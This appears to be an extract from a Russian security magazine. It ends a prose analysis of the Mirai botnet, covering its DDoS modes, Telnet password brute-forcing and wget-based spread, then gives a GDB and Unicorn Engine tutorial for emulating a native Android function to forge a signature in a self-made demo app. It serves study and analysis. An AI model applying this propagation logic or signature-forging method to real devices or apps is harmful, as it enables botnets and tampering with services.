была явно ско пирована функция флуда и генератор псевдослучайных данных
для заполнения пакетов, отсылаемых на атакуемые хосты. Такое «перекрес‐
тное опыление», в целом характерное для разработчиков open source софта
для Linux, по всей видимости, прижилось и в среде ориентирующихся на эту
платформу вирмей керов.
  Все ранние версии Mirai для разных аппаратных архитектур были статичес‐
ки скомпилированы и использовали стандартную библиотеку uClibc.so, пред‐
назна чен ную для встра иваемых сис тем на базе uCLinux. При запус ке тро ян
выделял область памяти, в которую загружал необходимый для его работы
конфиг.
  Некоторые конфигурационные стро ки хранились в зашифрованном виде
в самом файле ELF и перед загрузкой в память расшифровывались. В час‐
тности, таким образом передавался адрес и порт управля ющего сервера,
User‐Agent и дру гие парамет ры HTTP‐запросов. Отсюда становится понятен
способ, с помощью которого исследова тели определили адрес командного
центра этого ботнета.
  Еще одна примечатель ная функция ранних версий Mirai — способность
трояна в отдельном потоке убивать работающие процес сы других конкуриру‐
ющих ботов, читая в непрерыв ном цикле содержимое папки /proc/. Спи сок
названий процессов хранился в конфиге. А вот в обработчике конфига авто‐
ры  Mirai допустили неболь шой баг: список процессов читался блоками
по 2048 байт, после чего поиск названия выпол нялся внутри этого буфера.
Если иско мое значение располагалось на границе блока, оно игнориро‐
валось, и такой процесс избегал общей печальной участи.
   Чтобы пре дотвра тить случайную выгрузку собственного процес са, троян
размещал в его папке файл .shinigami — при обнаружении файла с этим
именем процесс авто матически исключался из «расс трельного списка».
Однако  в самом коде зловреда был зашит лимит жиз неде ятель нос ти
на зараженном устройстве: по истечении недели неп рерывной работы про‐
цесс Mirai автоматически завершается.
  Описываемая здесь ранняя версия  Mirai умела выполнять с десяток
команд, среди которых — команды на установку и завер шение TCP‐соеди‐
нения с указан ным хостом и различные виды флуда по протоколам HTTP, UDP
и UDP over GRE. Также с помощью этого трояна можно было организовать
DNS ﬂood и TSource Query Flood, то есть целый комплекс атак на отказ
в обслужива нии.
  При соеди нении с управляющим сервером тро ян сообщал ему IP‐адрес
и MAC‐адрес сетевого интерфейса, а также идентификатор архитектуры
заражен ного устройства. В ответ он ожидал поступле ния команд, для выпол‐
нения каждой из которых создавал форк собственного процес са, имеющий
заданную в специальной переменной продолжительность жизни.
   Если за один цикл пос тупало сра зу несколько команд, они выполнялись
по очереди. При этом команды на начало DDoS‐атаки мог ли содержать нес‐
колько целей, перечисленных в мас сиве. Содержимое коман ды разбиралось
специальным парсером, затем злов ред в опре деленном порядке фор‐
мировал заголовки пакетов, их содержимое (либо при необходимости брал
их из кон фига), отправ лял эти пакеты заданному хосту и после подсчета кон‐
трольной сум мы переходил к следующей цели.
   Вся эта про цедура продолжалась в непрерывном цикле до тех пор, пока
выполняющий команду процесс не завершался по таймеру. В случае DNS‐
флуда Mirai отправ лял на атакуемый DNS‐сервер по сто слу чайных зап росов
доменных имен за один цикл, что при наличии хотя бы сотни активных ботов
гарантированно укладывало сервер на лопат ки.
  С помощью специаль ного набора команд оператор мог очень гибко нас‐
траивать параметры атаки: определять зна чения TCP‐фла гов, указывать такие
характерис тики пакетов, как maximum segment size и timestamp, отправлять
пустые пакеты, пакеты со случайными зна чениями или информацией из кон‐
фигура ции трояна, задавать целевой порт и размер отсылаемых данных,
а также управлять прочими TCP‐парамет рами.
  Кроме всего прочего, Mirai позволял флудить на заданный узел инкапсу‐
лированными пакетами GRE с использованием Transparent Ethernet Bridging.
В этом слу чае встроенный пакет вклю чал в себя полноценный Ethernet‐
фрейм, в котором MAC‐адре са как получателя, так и отправителя Mirai
генери ровал случайным образом.
  В общем, у разработ чиков получился довольно мощный DDoS‐комбайн,
позволяющий реализовы вать разные сценарии атак и объеди нять заражен‐
ные умные девай сы с почти любой аппаратной архитектурой в пол ноценные
ботнеты.
  Один из важных функциональ ных модулей Mirai — сканер уязвимых хостов,
с которыми мож но соединиться по протоколу Telnet. Этот сканер был прак‐
тически полностью позаимс твован из исходников Linux‐трояна Fgt.
  В общих чертах алгоритм работы модуля состоит из четырех этапов: поиск
уязвимых хостов в сети, перебор логинов и паролей по словарю, после
успешного соединения — отправка на скомпрометированный девайс sh‐
скрипта, который в качестве финального аккорда выкачивает с управляющего
сервера троянский бинарник под нужную архитектуру.
  А теперь по порядку. Для начала ска нер создает 256 структур данных,
содержащих случайный IP‐адрес, параметры сокета и другую полезную
информа цию. Из спис ка генерируемых адресов исклю чаются все локаль ные
и частные диапазоны. Затем с каждым из них трой пытается уста новить
соединение, при воз никновении ошибки отсылая на собственный управля‐
ющий сер вер сооб щение.
  В ответах атакуемого узла сканер ищет строки user, login, pass, dvrdvs
или name,  указывающие на  требование передачи  логина, который он
и отправляет, вос поль зовавшись словарем из конфига.
   Если логин успешно угадан, на управляющий сер вер уходит сооб щение
login prompt found с ука зани ем номера структуры и порядкового номера
задачи, в противном случае троян рапортует об ошиб ке или тайм‐ауте.
  Затем в ответе хоста ищут ся строки, указывающие на запрос пароля. Если
они обнаружены, хосту передается строка из словаря, а полученный ответ
проверяется на наличие зна чений invalid, incorrect, fail, again, wrong,
accessdenied, error, bad, success, busybox, shell или dvrdvs. Они сви‐
детельствуют об успехе или провале авторизации.
  Соответствующий отчет также отправляется на командный сервер. После
этого процедура бру та повторяется в цикле для всех 256 структур. Таким
образом, за каждый проход цикла сканер может «окучить» до 256 случайных
IP‐адре сов.
   Если авториза ция прошла успешно, на взломанный хост отправляется
команда wget, которая выкачивает с управляющего сервера и сохраняет
в папку /tmp/ sh‐скрипт. Он, в свою очередь, загружает из сети бинарный
файл трояна, соот ветствующий архитектуре устройства. С помощью этого
нехитрого алгорит ма организуется автомати ческое распространение Mirai
и зараже ние новых умных устройств, из которых впос ледс твии формируется
ботнет.


SHOW MUST GO ON
Любой программный продукт эволюционирует со временем: его создатели
устраняют выявленные ошибки и понемногу добавляют новые функции. Это в
полной мере отно сит ся и к Mirai.
  В сле дующей версии, рас пространявшейся летом 2016 года, соз датели
трояна отказались от динамичес кого выделения памяти для хранения кон‐
фига в пользу статической области — видимо, что бы повысить стабильность
работы программы в целом. Поксоренные строки в конфиге после рас‐
шифровки и чтения зашифровывались обратно прямо в памяти. Наконец, был
исправлен баг с про пус ком имен убиваемых про цес сов, если те оказыва лись
на границе блока данных, — теперь парсер научился обращаться к ним
по индексу, совпадающе му с позицией стро ки в массиве.
  Был полностью переписан генератор псевдослучайных значений, а при
запуске  Mirai опре делял  IP‐адрес заражен ного девайса, пос тучавшись
на DNS‐сервер Google (раньше он обращался для этого к собственному
управля ющему серверу). Троян научился взаимодействовать с обработ‐
чиками сигналов и игнорировать SIGINT посредством sigprocmask с очевид‐
ной целью не дать пользователю при нудительно оста новить вредоносный
процесс.
  В новой версии Mirai была реализована функция смены адреса управля‐
ющего сервера с помощью SIGTRAP, а поступающие команды стали обра‐
батываться строго по одной во избежание формирования очереди.
  Для удобства работы с сокетами в составе трояна появился собственный
локальный сервер. Так, созданный троем берклиевский сокет PF_INET бин‐
дился на порт 48101 локал хоста и переходил в режим ожидания входяще го
соединения.
   Если вредоносу не уда валось создать сокет и подключиться к нему, троян
находил владеющий сокетом процесс и убивал его: таким образом исклю‐
чалось зависание программы при циклических попытках установить связь
посредством функции bind с занятым сокетом. Вот почему для защиты от Mi‐
rai некото рые спе циалисты по информа ционной безопасности рекомен‐
довали заблокировать на устройстве TCP‐порт 48101, если он не исполь зует‐
ся, — это нарушало нормальную работу встро енного в троян сервера.
  В обновленной версии была полностью пересмотрена самозащита: вмес‐
то костыля с фай лом .shinigami троян научился определять PID и не убивал
процесс, идентификатор которого совпадал с текущим. И без того богатые
функции Mirai пополнились воз можностью устраивать ата ки типа DNS Ampliﬁ‐
cation, зато в списке исчез флуд по протоколу HTTP — впрочем, в одной
из следующих версий он вер нулся на свое законное мес то.
  Модификация трояна, которую создатели опубликова ли на hackforums,
несколько отличалась от предыдущих редакций Mirai. Прежде всего, прог‐
рамма обре ла способность отключать сторожевой таймер watchdog, чтобы,
если сис тема зависнет, она авто матически не перезагрузилась. Чтобы зат‐
руднить поиск трояна на устройстве, имя его процесса выбира лось слу чай‐
ным образом в виде последовательности сим волов латинского алфа вита
и цифр.
  Еще один интересный момент: сразу после запуска Mirai уда лял с дис ка
собственный исполняемый файл. Наконец, при обнаружении процесса с име‐
нем .anime троян не просто выгружал его из памяти, но еще и уничтожал
соответствующий исполняемый файл — чем‐то создатели этого бота явно
насолили раз работ чикам.
  Помимо всего прочего, в исходниках сентябрьской версии Mirai для архи‐
тектуры x86 обнаружился примечательный баг: из‐за неверно указанного
имени бинарного файла конфигура ционная структура для него коррек тно
не заполнялась, однако затем троян предпринимал попытки чте ния из кон‐
фига. Но, несмотря на эту ошибку, троян был вполне работоспособным,
а богатый арсенал его функций покрывал практически все потребности
ботоводов.


НАСЛЕДНИКИ ИМПЕРИИ
На основе выложенных в Сеть исходников Mirai было создано огромное
количество клонов, дополнивших базовую разработку другими полезными
функциями.
   Вскоре после утечки в паблик на свет появилась версия Mirai, оснащенная
механиз мом генерации имен управляющего сервера (DGA), позаимствован‐
ным из трояна Ranbyus. Это весьма существенное новшество. Если адрес
управля ющего сервера жестко зашит в теле вредоносной программы или в
ее конфиге, прекращение работы сер вера ведет к утрате работоспособности
всего ботнета. В случае исполь зования DGA адре са управляющих серверов
генери руются трояном автоматичес ки по специальному алгоритму, и при
падении одного из них бот нет просто подключается к следующему, что
повышает живучесть сети.
  В одной из последующих версий Mirai появился локаль ный прокси‐сервер,
работающий в отдельном процессе, в других была добавлена функция само‐
обновления, а передаваемые управляющему центру сообщения стали шиф‐
роваться с помощью полученного ранее с этого же сервера четырехбай‐
тового ключа.
  Менялись используемые  Mirai пор ты, чтобы обеспечить даль нейшую
работу трояна, если владелец устройства заблокирует ранее известные.
Затем Mirai начал использовать эксплоиты для известных уязвимостей в Lin‐
ux‐прошивках IoT‐устройств: «Хакер» уже писал об этом.
  На основе кода Mirai некоторые энтузиасты попытались разработать собс‐
твенные версии троянов для Linux вроде широко известного в узких кругах
изделия мексиканских программис тов под названием BrickBot, тас кавше го
с собой экс плоиты для уязвимос тей CVE‐2018‐10561 и CVE‐2018‐10562. Этот
трой получил заслуженную популяр ность тем, что скачивал и запус кал
на зараженном девай се shell‐скрипт, который порой благополучно «окир‐
пичивал» устройство.
   Благодаря доступности исходного кода дру гим тро янам для IoT очень
сложно тягать ся по популярности с Mirai. Конкуренцию вредоносам этого
семейства может составить раз ве что уникальная раз работка вирусописа‐
телей под наз ванием Hajime. Но это уже совер шенно другая история, которую
я расскажу в следующий раз.
ВЗЛОМ
   UNICORN
    ENGINE





  АНАЛИЗИРУЕМ НАТИВНЫЕ БИБЛИОТЕКИ
     В ПРИЛОЖЕНИЯХ ДЛЯ ANDROID





Лучшая прак тика защиты мобильных при‐
ложений — это перенос  кода, который
отвечает за криптогра фию, хранение клю‐
чей для API и провер ку целос тнос ти сис‐
темы, в нативные биб лиотеки. Это сущес‐              loonydev                                                                                           loony.developer@gmail.com
твенно  увеличивает  сложность  ана лиза
защищен ности  приложения,  тем самым
выдвигая все больше требований к иссле‐
дователю. Но так ли это на самом деле?


Для начала нужно разобрать ся, что собой представляет Unicorn Engine.
Это эмулятор процес сора, он поддерживает множество архитектур и сам
является мультип латформенным. У Unicorn Engine в принципе нет сложных
подсистем. Ты сам занимаешься разметкой памяти и загрузкой данных, эму‐
лятор не понимает команды из std, поэтому их необходимо реализовывать
самостоятельно или вообще пропус кать.
  Существует множес тво решений, которые способны трассировать коман‐
ды на хос товую систему, загружать исполняемые файлы в память и многое
другое, так зачем тогда использовать Unicorn Engine?
  При иссле дова нии нативных биб лиотек часто не нужно эму лировать
работу все го процесса. Нам достаточно смоделировать работу какой‐то кон‐
кретной фун кции, не исполь зуя AVD или полноценные эму ляторы Android/iOS,
чтобы получить результат отдельно от основного процес са или устройства.


             INFO

                     Хороший пример мож но най ти в моей прошлой
                         статье, где был описан метод MITM‐атаки на при‐
                      ложение с использованием Xposed.


Одна из рекомендаций по защите от подобного типа атаки — под писывать
передаваемые данные. Но что, если раз работ чики не будут использовать
стандартный алго ритм, для которого просто нужно получить ключ из натив‐
ного приложения, а пойдут дальше и изменят его?
  Восстанавливать весь алгоритм достаточно трудоемко и требует боль‐
шого количества знаний — как в криптографии, так и в Reverse Engineering.
Здесь нам может помочь Unicorn Engine: определив, как передаются вхо‐
дящие параметры, мы можем проэмулировать работу иско мой функции
без понимания алгоритма ее работы.
  В этой статье мы исследуем упрощен ный вариант подписи дан ных.


             INFO

                        Статья рас считана на то, что ты знаешь, что такое
                       регистры, как работает стек, и не теря ешь соз‐
                      нание при виде ассемблерного кода.



ТЕСТОВЫЙ СТЕНД
Для демонстрации атаки мы будем исполь зовать самописное приложение
для Android, которое считывает данные из полей ввода в JSON и генерирует
подпись, используя некий алго ритм в нативной библиотеке. Наша цель —
получить такую же подпись и научиться генерировать валидную подпись
для любых данных. В реаль ной жизни этот JSON с под писью отправлялся бы
на сер вер, но здесь этот момент опускается.
  В нативном приложении реализован некий кастомный алгоритм подписи.
Его сложно наз вать криптостойким, но для демонс тра ции он идеален:
не очень объемный, но не слишком простой, как обычный XOR. Все необ‐
ходимые исходники ты можешь най ти на моем GitHub.
   Также нам понадобится Android Studio и Android SDK с NDK, установ‐
ленный Unicorn Engine и устройство или эмулятор для запуска. В этой статье я
буду использовать AVD x86.
  На устройстве (эмулято ре) должен находиться gdbserver, который можно
найти по такому адресу:


<android‐sdk>/ndk‐bundle/prebuilt/<device‐system>/gdbserver

Я обычно перемещаю его в /data/local/gdbserver на устрой стве.


СОБИРАЕМ ИНФОРМАЦИЮ
Начнем анализ с того, что загрузим наше приложение в Android Studio: File →
Proﬁle or Debug APK. Когда про ект загрузится, нам нужно исправить Run/De‐
bug Conﬁgurations: во вкладке Debugger переключить Debug type в Java. Если
этого не сде лать, то к приложению будет подключен отладчик из Android Stu‐
dio и подключить свой мы уже не сможем.
  Прежде чем начать, давай попробуем запустить приложение и ввес ти тес‐
товые дан ные test/pass. Запишем полученную подпись, так как она нам
еще пригодит ся.



  77 21 4f 57 4c 64 00 2e 39 01 4c 4e 7e 00 2e 2f 01 48 4a 7e 00 7b 6c
  51 5c 09 37 00 7c 62 50 4b 09 70



             INFO

                      Если приложение не имеет флага android:de‐
                   buggable="true",  то  его  нуж но  добавить,
                      пересоб рав приложение и отредактировав An‐
                   droidManifest с помощью apktool.



Ре верс APK
Для начала найдем основной класс. Он находит ся в loony/com/nativeexam‐
ple/MainActivity.



  .field getSign:Landroid/widget/Button;
  .field loginField:Landroid/widget/EditText;
  .field passwordField:Landroid/widget/EditText;
  .field sign:Landroid/widget/TextView;


Видим в начале объявление кнопки и двух полей для запол нения.



  .line 28
  const‐string v0, "native‐lib"
  invoke‐static {v0}, Ljava/lang/System;‐>loadLibrary(Ljava/lang/String;)V


Ниже происходит заг рузка библиотеки и объявлен нативный метод .method
public native magic(Ljava/lang/String;)[I, который принимает строку,
а на выходе возвращает мас сив чисел. В том же клас се есть фун кция .method
private getHexString(I)Ljava/lang/String;, которая принимает массив
чисел и воз вра щает hex‐строку.
  Посмотрим, что происходит при создании класса, и перейдем в onCreate.



  new‐instance v1, Lloony/com/nativeexample/MainActivity$1;
  invoke‐direct {v1, p0}, Lloony/com/nativeexample/MainActivity$1;‐>
  (Lloony/com/nativeexample/MainActivity;)V
  invoke‐virtual {v0, v1}, Landroid/widget/Button;‐
  >setOnClickListener(Landroid/view/View$OnClickListener;)V


Создается новый обработчик нажатий, в него переда ется экземпляр loony/
com/nativeexample/MainActivity$1, перей дем туда. Нас интересуют фун‐
кции, которые отвечают за действия, в нашем случае это толь ко onClick.
  В коде вид но, что создается org/json/JSONObject;, считываются данные
из loginField, passwordField и помеща ются в JSONObject с ключами login
и password соответственно.



  invoke‐virtual {v0}, Lorg/json/JSONObject;‐>toString()Ljava/lang/String;
  move‐result‐object v2
  invoke‐virtual {v1, v2}, Lloony/com/nativeexample/MainActivity;‐
  >magic(Ljava/lang/String;)[I
  move‐result‐object v1


JSONObject преобразовывается в строку и передается в нативную функцию.


Подключение отладчика
Чтобы под ключить отладчик, нам нужно пос тавить брейк‐пойнт в Android Stu‐
dio до вызова magic(Ljava/lang/String;)[I. У себя в тестах я ставил точку
останова еще в onCreate.
  Запустим наше приложение в режиме отладки. Откроется эмулятор,
и «Студия» под ключит отладчик Java. Приложение останов лено. Управление
находится в Android Studio.
   Итак, теперь нужно найти PID процесса. Для этого подклю чимся к устрой‐
ству через adb и запус тим ps.



   $ adb shell
   $ ps | grep loony
   u0_a66 12949 1342 1390432 45556 futex_wait aef07424 S
  loony.com.nativeexample


Теперь, ког да у нас есть PID 12949, мы можем подключать к нему сервер
GDB.



   $ /data/local/gdbserver :5039 ‐‐attach 12949
   Attached; pid = 12949
   Listening on port 5039


Здесь мы запускаем сервер на 5039‐м порте и подключаем его к нашему
процессу. Теперь в дру гой вкладке терминала пропишем передачу этого пор‐
та с эмулятора в основную систему.



   $ adb forward tcp:5039 tcp:5039


Только после это го можно запускать GDB и подключать его к нашему девай‐
су. Путь к GDB будет такой:


<android‐sdk>/ndk‐bundle/prebuilt/darwin‐x86_64/bin



   $ ./gdb
   (gdb) target remote :5039



             INFO

                        Когда запус кается отладчик, управле ние и коман‐
                    ды передаются в его терминал. В начале строки
                         у тебя дол жно отображаться (gdb), и все коман‐
                        ды, которые будут ниже и имеют такую приставку,
                      должны быть введены в терминал GDB.


Загрузят ся библиотеки, и ты уви дишь что‐то вроде 0xaef07424 in __ker‐
nel_vsyscall (). У тебя адреса, в которых работает приложение, скорее
всего, будут другими.
   Этот ответ озна чает, что отладчик под клю чил ся и получил данные от сер‐
вера. Если библиотеки не заг рузились, то пов тори подключение сно ва.
Не забывай, что в этот момент тот отладчик, который был подключен от име ни
Android Studio, тоже остановился. Управление сей час находится у GDB.


Анализ функции
Теперь нам нужно определить, где находится исследуемая функция, что она
использует, как передаются данные и как их потом можно получить. Для этого
найдем фун кцию с помощью GDB.


info function <regex>

Или можно запустить просто info function, но тог да будут отображены все
функции, что не очень удоб но.
   Названия всех нативных функций собираются из приставки Java, наз вания
пакета и названия функции, а весь regex начинается с ^. Сделаем поиск
по началу имени пакета.


  (gdb) info functions ^Java_loony_com
  All functions matching regular expression "^Java_loony_com":
  Non‐debugging symbols:
  0xa96cb720  Java_loony_com_nativeexample_MainActivity_magic


Итак, мы нашли нуж ную функцию. Ставим на нее брейк‐пойнт (gdb) b *0x‐
a96cb720 и запус каем выполнение коман дой (gdb) c. Теперь управле ние
вернулось к Android Studio, где мы тоже запус каем выпол нение программы.
Переходим в эмулятор, вводим тестовые данные test/pass и нажима ем кнопку
Calculate sign. Если управле ние вернулось к GDB и ты видишь Thread 1 "m.
nativeexample" hit Breakpoint 1, 0xa96cb720, то все сде лал верно.
   Теперь посмотрим, что собой представляет функция. Но перед этим
переключимся на Intel disassembly style, выполнив (gdb) set disassembly‐
flavor intel. Даль ше запустим команду дизас семблирования (gdb) dis‐
assemble. Здесь нам нужно най ти точку, пос ле которой начинается основное
тело функции — в нашем слу чае подсчет подписи. Кроме того, нужно пос‐
тараться минимизировать количество кода для эмуляции, потому что чем
больше кода мы эму лируем, тем больше проблем может возникнуть.
  Ниже приведены лишь некоторые важ ные блоки. Не забывай, что я опус‐
тил часть кода, чтобы не перег ружать статью.



  Dump of assembler code for function Java_loony_com_nativeexample_MainAc‐
  tivity_magic:
    => 0xa96cb720 <+0>:   push   ebp
     0xa96cb721 <+1>: mov    ebp,esp
     0xa96cb72e <+14>:    call   0xa96cb733
     0xa96cb779 <+89>:    call   0xa96cb540 <_ZN7_JNIEnv17GetStringUT‐
  FCharsEP8_jstringPh@plt>
     0xa96cb79e <+126>:   call   0xa96cb540 <_ZN7_JNIEnv17GetStringUT‐
  FCharsEP8_jstringPh@plt>
     0xa96cb7bc <+156>:   call   0xa96cb550 <_Z7getSizePc@plt>
     0xa96cb7d0 <+176>:   mov    edx,esp
     0xa96cb7da <+186>:   call   0xa96cb560
  <_ZN7_JNIEnv11NewIntArrayEi@plt>
     0xa96cb83b <+283>:   mov    eax,DWORD PTR [esi+0x40]
     0xa96cb83e <+286>:   mov    ecx,DWORD PTR [esi+0x2c]
     0xa96cb841 <+289>:   movsx  eax,BYTE PTR [eax+ecx*1]
     0xa96cb845 <+293>:   cmp    eax,0x0
     0xa96cb848 <+296>:   je     0xa96cb8be
     0xa96cb862 <+322>:   cmp    DWORD PTR [esi+0x28],0x118
     0xa96cb869 <+329>:   jge    0xa96cb880
     0xa96cb87b <+347>:   jmp    0xa96cb88d
     0xa96cb88d <+365>:   cmp    DWORD PTR [esi+0x38],0x5
     0xa96cb891 <+369>:   jle    0xa96cb8a1
     0xa96cb897 <+375>:   xor    eax,eax
     0xa96cb899 <+377>:   mov    DWORD PTR [esi+0xc],eax
     0xa96cb89c <+380>:   jmp    0xa96cb8aa
     0xa96cb8b9 <+409>:   jmp    0xa96cb83b
     0xa96cb8be <+414>:   mov    eax,DWORD PTR [ebp+0x8]


Мы видим несколько функций GetStringUTFChars, которые необ ходимы
для преобразования форматов строк. Дальше сле дует вызов внут ренней
функции getSize, которая получает размер строки. Этот размер передается
в NewIntArray, где соз дает ся результирующий массив.
  После этого мы видим цикл подсчета под писи. По адресу 0xa96cb8b9 —
переход в 0xa96cb83b. Дальше в коде есть вызов преобра зования массива
и передача его на вывод. Так что все, что нам необходимо, заперто в цикле
0xa96cb83b — 0xa96cb8b9. Соот ветс твенно, в 0xa96cb8be мы будем иметь
сформированный возвращаемый массив, а по адре су 0xa96cb83b точно рас‐
положена входящая стро ка.
  Для проверки этого предположения поставим точку останова в (gdb) b
*0xa96cb83b и продолжим работу (gdb) c. Перед поиском точки инъекции
входящих данных посмотрим на то, что делают 0xa96cb83b — 0xa96cb845.
Они перебирают по одному символу входящей строки, где один сим вол
получается в результате eax+ecx*1.
  Из этого мож но сделать вывод, что в eax находится ссылка на начало
строки, а в ecx — текущий индекс эле мента. Заполнение eax происходит
по адресу 0xa96cb83b путем счи тыва ния со стека позиции строки в памяти.
Следовательно, чтобы словить момент, когда у нас будет ссылка на начало
строки, нужно брать начало следующей команды 0xa96cb83e. Сделаем один
шаг, что бы перейти в нужный адрес (gdb) ni.
   Теперь посмотрим, что у нас находится в eax. Сделаем вызов (gdb) x/s
$eax, где x отоб ража ет данные из памяти по заданному адре су и в опре‐
деленном формате, который задается через /s — формат строки, $eax —
получение адре са из регистра eax. В ито ге мы получаем команду отоб‐
ражения строки из памяти по адресу из eax.



  (gdb) x/s $eax
  0xa10a1c70: "{\"login\":\"test\",\"password\":\"pass\"}"


Чтобы вставить свою стро ку, нам нуж но переписать адрес 0xa10a1c70,
с которого считыва ется строка и который находится в esi+0x40.
   Что насчет считывания результата? Уберем точку останова, для этого
выведем спи сок поставлен ных точек (gdb) info break, найдем индекс нуж‐
ной и выполним (gdb) del <index>. Теперь поставим останов после выхода
из мас сива (gdb) b *0xa96cb8be и продолжим работу (gdb) с. Посмотрим,
что находит ся в регистрах (gdb) i r.


eax            0x0  0
ecx            0x22 34
edx            0xbf84f2d0   ‐1081806128
ebx            0xa96cefd8   ‐1452478504
esp            0xbf84f2d0   0xbf84f2d0
ebp            0xbf84f3e8   0xbf84f3e8
esi            0xbf84f360   ‐1081805984
edi            0xbf84f2d0   ‐1081806128

Очевидно, что ecx — длина входящего или выходящего массива. Отобразим
содержимое памяти остальных регистров. Мы пытаемся найти байт‐мас сив
из 34 элемен тов. Выполним (gdb) x/34x $edx, где после / стоит количество
элементов,  которые  будут выведены,  дальше  тип и  регистр. Больше
информа ции можешь получить, выполнив (gdb) help x.



  0xbf84f2d0: 0x00000077 0x00000021 0x0000004f  0x00000057
  0xbf84f2e0: 0x0000004c  0x00000064 0x00000000 0x0000002e
  0xbf84f2f0: 0x00000039 0x00000001 0x0000004c  0x0000004e
  0xbf84f300: 0x0000007e  0x00000000 0x0000002e  0x0000002f
  0xbf84f310: 0x00000001 0x00000048 0x0000004a  0x0000007e
  0xbf84f320: 0x00000000 0x0000007b  0x0000006c  0x00000051
  0xbf84f330: 0x0000005c  0x00000009 0x00000037 0x00000000
  0xbf84f340: 0x00000078 0x00000066 0x00000050 0x0000004c
  0xbf84f350: 0x00000009 0x00000070


Забегая вперед, скажу, что GDB нам еще понадо бится, так что терминал
можешь не закрывать. А пока поговорим про базовые методы работы
с Unicorn.


Unicorn 101
Установку для твоей системы можно посмотреть на официальном сай те. Я
буду работать с версией библиотеки для Python, так как это сильно ускоряет
и упрощает разработку решения, но можно исполь зовать версию для любого
языка, к примеру C, Java, Go, Ruby и даже FreePascal. Со всем перечнем дос‐
тупных языков можно ознакомиться в репозитории на GitHub.
   Теперь создаем пустой файл python и импортируем Unicorn.


from unicorn import *
from unicorn.x86_const import *

Вторая строка может меняться в зависимости от архи тек туры, которую ты
собираешься эму лировать. А выбрать у Unicorn Engine есть из чего: здесь
и привычный x86, и ARM, ARMv8, M68K, MIPS, и даже Sparc. Эмуляторы AVD
приоритетно работают с архи тектурой x86.
   Дальше нуж но соз дать эму лятор, передать архи тек туру и раз рядность сис‐
темы.


mu = Uc(UC_ARCH_X86, UC_MODE_32)

Так как этот эму лятор буквально ничего не делает, кроме эмуляции кода, то
размечать память и загружать все необходимые данные мы будем самос‐
тоятельно. Для этого нужно передать в функцию mem_map адрес, с которого
начинать разметку, и раз мер блока, задава емый в бай тах. Пока ты этого
не сде лаешь, ты не сможешь загружать данные в эту часть памяти. Размечать
память мож но в любой адрес, но зачас тую мы будем использовать адреса
с рабоче го при ложе ния.


ADDRESS = 0x1000000
mu.mem_map(ADDRESS, 2 * 1024 * 1024)

Теперь загрузим данные в память, для этого возьмем неболь шой кусок
ассемблерного кода из примера на GitHub. О том, как загрузить в память
большие объемы данных или дампов, мы поговорим в разделе «Атаки».


X86_CODE32 = b"\x41\x4a\x66\x0f\xef\xc1" # INC ecx; DEC edx; PXOR
xmm0, xmm1
mu.mem_write(ADDRESS, X86_CODE32)

Для работы с регистрами используются две функции: reg_read и reg_write.
В качестве параметров для записи передается константа регис тра и hex‐чис‐
ло, но не больше разрядности системы. То есть если это 32‐битная система,
то это не больше четырех бай тов. Для чтения нужна только кон станта регис‐
тра.


mu.reg_write(UC_X86_REG_ECX, 0x1234)
mu.reg_write(UC_X86_REG_EDX, 0x7890)

Чтобы отслеживать изме нения и процесс работы системы, нужно добавить
хуки на команды и работу с памятью; после написания эму лятора их можно
удалить. Объ явим функцию, которая принимает необходимые параметры:
экземпляр эмулятора, адрес команды, размер и параметр от пользователя.
О том, как работать с пользовательскими параметрами, я расскажу в разделе
«Атаки».


def hook_code(uc, address, size, user_data):
    print(">>> Tracing instruction at 0x%x, instruction size = 0x%x"
%(address, size))
mu.hook_add(UC_HOOK_CODE, hook_code)

Теперь все готово для того, чтобы запустить наш первый эмулятор. В качес‐
тве параметров передаются адреса начала и окончания эмуляции.


mu.emu_start(ADDRESS, ADDRESS + len(X86_CODE32))

После этого, чтобы посмотреть на резуль тат работы, выведем информацию
с регистров.


r_ecx = mu.reg_read(UC_X86_REG_ECX)
r_edx = mu.reg_read(UC_X86_REG_EDX)
print(">>> ECX = 0x%x" %r_ecx)
print(">>> EDX = 0x%x" %r_edx)

Для работы с памятью используют ся коман ды mem_read и mem_write. О том,
как записывать в память, мы поговорим позднее, а здесь я покажу, как можно
считывать данные. Для  этого  в функцию mem_read передается адрес
и количество бай тов, которые необходимо считать, фун кция возвращает мас‐
сив байтов. Пос ле это го можно запускать написанный код.


tmp = mu.mem_read(ADDRESS, 4)
print(">>> Read 4 bytes from [0x%x] = 0x" %(ADDRESS), end="")
for i in reversed(tmp):
    print("%x" %(i), end="")
print("")

Больше примеров работы c Unicorn Engine ты можешь посмотреть в репози‐
тории про екта.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
     UNICORN ENGINE
             АНАЛИЗИРУЕМ НАТИВНЫЕ БИБЛИОТЕКИ
                   В ПРИЛОЖЕНИЯХ ДЛЯ ANDROID





По лучение дампов из библиоте ки
Как ты про читал выше, нам нужно будет загрузить в память исполня емый код
функции, которую мы собираемся эмулировать, и окружение. Это необ‐
ходимо для вызовов и обращений, которые происходят внутри функции.
Для начала получим дамп только нашей библиотеки, а все необ ходимое окру‐
жение заг рузим уже в про цес се эмуляции.
  Сначала заново подключим отладчик, чтобы итерация цикла получения
подписи ни разу не выполнялась до этого. Как это сделать, описано в раз‐
деле «Подключение отладчика». Мы будем эмулировать работу с 0xa96cb83b,
так что поставим останов именно в точ ке (gdb)  b  *0xa96cb83b, чтобы
получить окружение, соответству ющее той же команде, с которой мы начина‐
ем эмуляцию.
  Продолжим  работу  программы. Введем  тестовые  данные  test/pass
и попадем в точ ку останова.
  Для начала выведем текущее состояние регистров.


eax            0xa96cefd8   ‐1452478504
ecx            0x22 34
edx            0x90 144
ebx            0xa96cefd8   ‐1452478504
esp            0xbf84f6d0   0xbf84f6d0
ebp            0xbf84f7e8   0xbf84f7e8
esi            0xbf84f760   ‐1081804960
edi            0xbf84f6d0   ‐1081805104
eip            0xa96cb83b   0xa96cb83b <Java_loony_com_nativeexa
mple_MainActivity_magic+283>

Теперь посмотрим, в какой части памяти находит ся нативная библиотека
и стек, который будет необходим для эмулятора.



  (gdb) info proc mappings
  ...
  0xa96cb000 0xa96cc000 0x1000 0x0 /data/app/loony.com.nativeexample‐
  1/lib/x86/libnative‐lib.so
  0xa96cc000 0xa96cd000 0x1000 0x0 /data/app/loony.com.nativeexample‐
  1/lib/x86/libnative‐lib.so
  0xa96cd000 0xa96ce000 0x1000 0x1000 /data/app/loony.com.nativeexample‐
  1/lib/x86/libnative‐lib.so
  ...
  0xbf055000 0xbf854000 0x7ff000 0x0 [stack]


